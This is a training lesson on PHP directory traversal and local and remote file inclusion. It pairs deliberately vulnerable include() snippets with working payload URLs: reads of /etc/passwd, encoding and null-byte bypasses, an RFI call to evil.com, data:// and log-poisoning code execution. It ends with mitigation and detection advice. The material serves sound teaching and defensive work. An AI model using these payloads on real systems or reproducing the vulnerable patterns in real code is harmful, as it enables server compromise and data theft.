# Directory Traversal & File Inclusion

## What you will learn in this course üßêüßê

- Understand the concepts of Directory Traversal and File Inclusion vulnerabilities
- Learn about the differences between Local File Inclusion (LFI) and Remote File Inclusion (RFI)
- Explore common exploitation techniques and payloads for LFI and RFI vulnerabilities

Directory Traversal & File Inclusion vulnerabilities occur when an attacker manipulates file path references to access unauthorized directories or files on the server. This can lead to unauthorized data exposure, server compromise, and execution of malicious code.

Attackers exploit Directory Traversal & File Inclusion vulnerabilities by manipulating input parameters that reference files or directories. For instance, an attacker may modify a file path parameter (`../../`) to navigate outside the intended directory structure, accessing files containing sensitive information or executable scripts.

### What's the difference between Path Traversal and File Inclusion?

**Path Traversal** refers to the unauthorized access and navigation through directories within a file system. Attackers exploit this vulnerability by manipulating input parameters that reference file paths. By using techniques such as `../` or `..\`, they attempt to traverse directory structures beyond the intended scope, aiming to access sensitive files stored on the server.

Subsequently, attackers leverage this capability to interact with files, a concept known as **File Inclusion**. There are two primary types of File Inclusion vulnerabilities:

1. **Local File Inclusion (LFI):** In LFI attacks, attackers manipulate input parameters to include local files already present on the server. By injecting directory traversal sequences (`../`), they navigate to critical system files or sensitive application resources. This can lead to unauthorized disclosure of data or execution of malicious code stored within the system.

2. **Remote File Inclusion (RFI):** RFI vulnerabilities occur when applications dynamically include files from external sources controlled by user input. Attackers exploit this by providing URLs of malicious files hosted on remote servers. When the application processes this input without proper validation, it may download and execute arbitrary code from the remote location. This can result in complete compromise of the application, leading to data breaches or server takeover.

### Local File Inclusion (LFI)

![LFI](https://cyber-lead-assets.s3.amazonaws.com/M01-Security_Evaluation_and_Testing_(Red)/D05-Web_Pentesting_02/01-lectures/local-file-inclusion.png)

#### Basic LFI

**Vulnerable Code:**

```php
<?php
if (isset($_GET['page'])) {
    include($_GET['page']);
} else {
    include('home.php');
}
?>
```

**Exploitation:**

- **URL (Payload):**

```bash
http://example.com/index.php?page=/etc/passwd
```

- **Explanation:** This URL allows an attacker to include and view the contents of sensitive system files like `/etc/passwd` on Unix-based systems. In a legitimate scenario, this functionality might be used to dynamically load different pages or sections of a site. However, it should be carefully controlled to prevent unauthorized access.

#### Traversal Sequences

**Vulnerable Code:**

```php
<?php
$page = $_GET['page'];
include("pages/" . $page);
?>
```

**Exploitation:**

- **URL (Payload):**

```bash
http://example.com/index.php?page=../../../../etc/passwd
```

- **Explanation:** This attack uses traversal sequences to navigate out of the intended directory and access system files. In legitimate use, directory traversal is used to organize and manage files within a specific structure. Proper validation should prevent users from accessing files outside the intended directory.

#### Null Byte Injection

**Vulnerable Code:**

```php
<?php
$page = $_GET['page'] . ".php";
include("pages/" . $page);
?>
```

**Exploitation:**

- **URL (Payload):**

```bash
http://example.com/index.php?page=../../../../etc/passwd%00
```

- **Explanation:** The `%00` null byte terminates the string early, bypassing the `.php` extension and allowing access to files such as `/etc/passwd`. Although this is largely mitigated in modern PHP versions, null byte injection can be used to bypass file extension checks. In legitimate scenarios, proper handling and validation of file extensions are essential to prevent such bypasses.

#### Encoding Tricks

**Vulnerable Code:**

```php
<?php
$page = $_GET['page'];
include($page);
?>
```

**Exploitation:**

- **URL (Payload):**

```bash
http://example.com/index.php?page=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd
```

- **Explanation:** Double encoding (`%25`) is employed to bypass filters that prevent directory traversal attacks. Legitimately, encoding tricks are used to handle special characters in URLs and paths safely. Proper decoding and validation are crucial to ensure that encoded paths do not bypass security measures.

### Remote File Inclusion (RFI)

![RFI](https://cyber-lead-assets.s3.amazonaws.com/M01-Security_Evaluation_and_Testing_(Red)/D05-Web_Pentesting_02/01-lectures/remote-file-inclusion.png)

#### Basic RFI

**Vulnerable Code:**

```php
<?php
if (isset($_GET['file'])) {
    include($_GET['file']);
}
?>
```

**Exploitation:**

- **URL (Payload):**

```bash
http://example.com/index.php?file=http://evil.com/shell.txt
```

- **Explanation:** This URL allows the inclusion of a remote file, which could contain malicious PHP code. In a legitimate scenario, RFI might be used to dynamically include configuration files from a remote server. However, this should be carefully controlled to prevent malicious exploitation. Ensure that remote file inclusion is disabled (`allow_url_include=0` in PHP configuration) if not required.

#### Data Protocol

**Vulnerable Code:**

```php
<?php
if (isset($_GET['file'])) {
    include($_GET['file']);
}
?>
```

**Exploitation:**

- **URL (Payload):**

```bash
http://example.com/index.php?file=data:text/plain,<?php echo shell_exec('ls'); ?>
```

- **Explanation:** The `data` protocol enables the direct inclusion and execution of PHP code from a URL. Legitimately, data protocols can be used to include small snippets of data or configuration settings. Proper validation and sanitization are necessary to prevent code execution via data URLs.

### PHP Wrappers and Protocols

#### php://filter

**Vulnerable Code:**

```php
<?php
include($_GET['file']);
?>
```

**Exploitation:**

- **URL (Payload):**

```bash
http://example.com/index.php?file=php://filter/convert.base64-encode/resource=index.php
```

- **Explanation:** The `php://filter` wrapper reads the contents of a file and encodes it in base64, which can then be decoded to reveal the file‚Äôs contents. This technique might be used to inspect or manipulate files safely. In a legitimate scenario, using `php://filter` for encoding or decoding data requires careful implementation to avoid security risks.

#### zip:// and rar://

**Vulnerable Code:**

```php
<?php
$filename = $_GET['file'];
include("zip://" . $filename);
?>
```

**Exploitation:**

- **URL (Payload):**

```bash
http://example.com/index.php?file=/var/www/html/malicious.zip#payload.php
```

- **Explanation:** The server includes and executes `payload.php` from within a compressed file. Legitimately, zip and rar protocols are used to handle compressed files. Proper handling of compressed archives should ensure that only trusted files are included.

#### data://

**Vulnerable Code:**

```php
<?php
include($_GET['file']);
?>
```

**Exploitation:**

- **URL (Payload):**

```bash
http://example.com/index.php?file=data:text/plain,<?php phpinfo(); ?>
```

- **Explanation:** The `data://` protocol allows PHP code to be included directly from the URL. In a legitimate context, this might be used for including small inline scripts or data. Ensure that any use of the `data://` protocol is restricted and validated to prevent code execution vulnerabilities.

#### expect://

**Vulnerable Code:**

```php
<?php
$cmd = $_GET['cmd'];
include("expect://" . $cmd);
?>
```

**Exploitation:**

- **URL (Payload):**

```bash
http://example.com/index.php?cmd=id
```

- **Explanation:** The `expect://` protocol executes system commands. This is rarely used in practice but might appear in some configurations. Legitimately, executing system commands via `expect` should be avoided unless absolutely necessary, with strict security measures in place.

### Advanced Techniques

#### Log File Injection

**Vulnerable Code:**

```php
<?php
include("/var/log/apache2/access.log");
?>
```

**Exploitation:**

- **Method:**

1. Inject PHP code into the access log:

```bash
curl "http://example.com/index.php" -H "User-Agent: <?php system('ls'); ?>"
```

2. Access the log file to execute:

```bash
http://example.com/index.php?page=/var/log/apache2/access.log
```

- **Explanation:** PHP code is injected into the server‚Äôs log file and then executed when the log is included. In a legitimate scenario, logs are used for monitoring and debugging. Proper log handling and sanitization are essential to prevent injection attacks.

#### Session File Inclusion

**Vulnerable Code:**

```php
<?php
session_start();
include("sess_" . session_id());
?>
```

**Exploitation:**

- **Method:**

1. Inject PHP code into the session file:

```php
$_SESSION['data'] = "<?php system('ls'); ?>";
```

2. Include the session file:

```bash
http://example.com/index.php
```

- **Explanation:** The session file is manipulated to include malicious PHP code. Sessions are used to store user-specific data, and their files should be securely handled to avoid unauthorized access.

#### /proc/self/environ

**Vulnerable Code:**

```php
<?php
include("/proc/self/environ");
?>
```

**Exploitation:**

- **Method:**

1. Inject code into the environment:

```bash
curl "http://example.com/index.php" -H "User-Agent: <?php system('ls'); ?>"
```

2. Access the environment variable to execute:

```bash
http://example.com/index.php
```

- **Explanation:** This technique involves injecting PHP code into environment variables and including them. Environment variables might be used to configure the application, but they should be properly sanitized to prevent code execution.

#### Phar Deserialization

**Vulnerable Code:**

```php
<?php
$phar = new Phar($_GET['file']);
include($phar);
?>
```

**Exploitation:**

- **Method:**

1. Create a malicious `.phar` file with serialized PHP code.
2. Include the `.phar` file:

```bash
http://example.com/index.php?file=malicious.phar
```

- **Explanation:** The `.phar` file is used to exploit deserialization vulnerabilities, allowing the execution of embedded PHP code. Phar files can be used for packaging applications or libraries, but they should be handled with care to prevent security issues.

### Bypasses and Exploits

#### Path Truncation

**Vulnerable Code:**

```php
<?php
$filename = $_GET['file'] . ".php

";
include($filename);
?>
```

**Exploitation:**

- **URL (Payload):**

```bash
http://example.com/index.php?file=../../../../etc/passwd
```

- **Explanation:** Path truncation or manipulation allows attackers to bypass file path restrictions. This might occur when paths are modified or truncated, so careful validation and handling of file paths are required.

#### Blind Path Traversal

**Vulnerable Code:**

```php
<?php
include($_GET['file']);
?>
```

**Exploitation:**

- **URL (Payload):**

```bash
http://example.com/index.php?file=php://filter/convert.base64-encode/resource=../../../../etc/passwd
```

- **Explanation:** Using PHP filters and encoding techniques, attackers can exfiltrate file contents without direct output. Properly validate and sanitize user inputs to prevent such blind attacks.

#### Segmentation Fault

**Vulnerable Code:**

```php
<?php
$filename = $_GET['file'];
include($filename);
?>
```

**Exploitation:**

- **Method:**
    1. Cause a segmentation fault to generate a temporary file.
    2. Include the temporary file to exploit the vulnerability.
- **Explanation:** This technique leverages server behavior during segmentation faults to exploit temporary files. Proper error handling and server configuration are crucial to avoid such vulnerabilities.

## Mitigation Techniques

To mitigate Directory Traversal and File Inclusion vulnerabilities, it's crucial to validate and sanitize all user inputs before they are used in file manipulation operations. Ensuring that inputs adhere to expected formats and filtering out dangerous characters or sequences, such as `../`, helps prevent users from escaping the intended directory structure. Using absolute paths rather than relative paths further reduces the risk of path manipulation.

Another effective approach involves creating a whitelist of authorized files and directories, allowing the inclusion of only those files that are explicitly approved. Limiting file and directory permissions ensures that only essential processes and users have access, thereby minimizing the potential impact if a vulnerability is exploited.

An example of secure PHP code that addresses these concerns is shown below:

```php
<?php
// Define a whitelist of allowed files
$allowed_files = [
    'home.php',
    'about.php',
    'contact.php'
];

// Get the 'page' parameter from the URL, sanitize it, and verify it's in the whitelist
$page = basename($_GET['page']);
if (in_array($page, $allowed_files)) {
    include(__DIR__ . '/pages/' . $page);
} else {
    // Redirect to a safe default page or show an error
    include(__DIR__ . '/pages/home.php');
}
?>
```

This code ensures that only files explicitly listed in the `$allowed_files` array can be included, thus preventing attackers from injecting arbitrary paths or filenames. By using the `basename()` function, the input is reduced to a simple filename, stripping away any directory information and null bytes, effectively mitigating path traversal attacks. Additionally, the use of the `__DIR__` constant ensures that the file inclusion is restricted to the intended directory, preventing unauthorized file access.

In addition to these coding practices, it is advisable to limit file and directory permissions to necessary users and processes. Disabling potentially dangerous PHP functions like `allow_url_include` and `allow_url_fopen` when not required, and configuring `php.ini` to restrict access to specific directories via `open_basedir`, further strengthens security. Implementing advanced security measures, such as a Content Security Policy (CSP) to block unauthorized script inclusions, and deploying a Web Application Firewall (WAF) to block known attack attempts, enhances the overall security posture. Logging all file access attempts and actively monitoring these logs are essential practices to detect any exploitation attempts in real-time.

## Detection Techniques

Detecting Directory Traversal and File Inclusion vulnerabilities relies on a combination of manual analysis, automated testing, and continuous monitoring. Regular code reviews are vital for identifying vulnerability points, particularly in code segments where files are dynamically included based on user parameters. Additionally, static analysis tools can automatically detect potential vulnerabilities by flagging dangerous code patterns and suggesting solutions.

Penetration testing is crucial for simulating real-world attacks and assessing the application's robustness against file inclusion exploits. These tests might involve techniques like null byte injection or PHP wrapper manipulation. Continuous monitoring of file system access logs is also necessary to identify attempts to access unauthorized files, especially those containing directory traversal sequences (`../`), which are often signs of a potential breach.

Implementing anomaly detection mechanisms, which monitor user behavior to identify deviations from normal usage patterns, helps quickly spot potential attacks. Security web scanners can be used to regularly audit applications and detect weaknesses in file inclusion management. Finally, setting up real-time alerts to immediately notify the security team of suspicious activities ensures a rapid response to threats.

## Resources

- [PortSwigger What is Path Traversal?](https://portswigger.net/web-security/file-path-traversal)
- [Pentester Guide to File Inclusion](https://www.cobalt.io/blog/a-pentesters-guide-to-file-inclusion)
